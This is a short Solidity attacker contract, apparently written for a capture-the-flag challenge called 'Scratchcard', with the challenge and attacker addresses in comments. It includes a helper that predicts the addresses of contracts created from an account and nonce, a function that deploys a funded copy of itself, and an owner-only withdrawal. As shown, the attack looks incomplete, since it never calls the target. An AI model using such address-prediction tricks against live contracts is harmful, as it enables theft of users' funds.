pragma solidity 0.4.24;
//Challenge Address 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e
//Attacker Address 0x43065950E0185BD74361D8580Daaa5BFF806aaDE
import "./Attack.sol";

contract Attack{
    address owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function addressFrom(address _origin, uint _nonce) external pure returns (address) {
        return address(keccak256(byte(0xd6), byte(0x94), _origin, byte(_nonce)));
    }

    function attackScratchcard() public payable{
        Attack con = (new Attack).value(msg.value)();
    }

    function withdraw() public {
        if (msg.sender == owner) {
            msg.sender.transfer(address(this).balance); 
        }
    }

    function () public payable {}
}